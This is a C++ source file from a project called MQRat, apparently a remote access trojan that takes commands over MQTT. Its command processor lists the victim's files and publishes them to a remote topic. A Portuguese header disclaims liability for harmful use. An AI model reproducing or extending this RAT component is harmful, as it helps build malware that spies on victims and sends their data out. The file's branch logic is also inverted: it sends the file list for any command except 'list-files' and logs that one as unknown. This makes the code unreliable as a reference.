/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"

CommandProcessor::CommandProcessor(string cmd, MqttClient *client)
{
    this->command = cmd;
    this->client = client;
}

void CommandProcessor::Process()
{
    string output = "";

    if(command != "list-files") {
        auto files = API::FileSystem::ListFiles();
        client->Publish(files, client->getSendTopic());
    } else {
		Log::LogInfo("Unknown command received: " + command);
	}
}
